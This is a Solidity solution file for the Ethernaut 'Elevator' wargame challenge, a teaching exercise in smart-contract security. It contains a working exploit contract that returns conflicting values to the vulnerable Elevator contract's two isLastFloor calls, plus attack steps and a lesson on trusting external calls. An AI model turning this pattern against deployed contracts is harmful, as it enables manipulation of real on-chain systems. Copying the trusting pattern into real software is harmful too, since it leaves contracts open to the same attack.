// Ethernaut Challenge #11: Elevator
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * ELEVATOR CHALLENGE
 * 
 * Goal: Reach the top floor (set top = true).
 * 
 * THE VULNERABILITY:
 * The contract calls an external contract (Building) and trusts
 * its return value without any verification.
 * 
 * We control the Building implementation, so we can lie about
 * whether we're at the top floor!
 * 
 * The attack uses a state variable to return different values
 * on the first vs second call within the same transaction.
 */

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract ElevatorExploit is Building {
    Elevator public target;
    bool public called;
    
    constructor(address _target) {
        target = Elevator(_target);
    }
    
    // Called twice by Elevator.goTo()
    // First call: return false (not last floor, continue)
    // Second call: return true (now it's last floor, set top=true)
    function isLastFloor(uint) external override returns (bool) {
        if (!called) {
            called = true;
            return false; // Not last floor, keep going
        }
        return true; // Now it's the last floor!
    }
    
    function attack() external {
        target.goTo(1);
    }
}

contract Elevator {
    bool public top;
    uint public floor;
    
    function goTo(uint _floor) public {
        Building building = Building(msg.sender);
        
        // First call: expects false
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            // Second call: expects true
            top = building.isLastFloor(floor);
        }
    }
}

/*
 * ATTACK STEPS:
 * 1. Deploy ElevatorExploit with target address
 * 2. Call attack() → triggers goTo(1)
 * 3. Elevator calls isLastFloor(1) → returns false
 * 4. Elevator sets floor = 1
 * 5. Elevator calls isLastFloor(1) again → returns true
 * 6. Elevator sets top = true
 * 
 * LESSON:
 * - Don't trust external contract return values blindly
 * - State can change between calls within the same tx
 * - External calls to attacker-controlled contracts are dangerous
 */
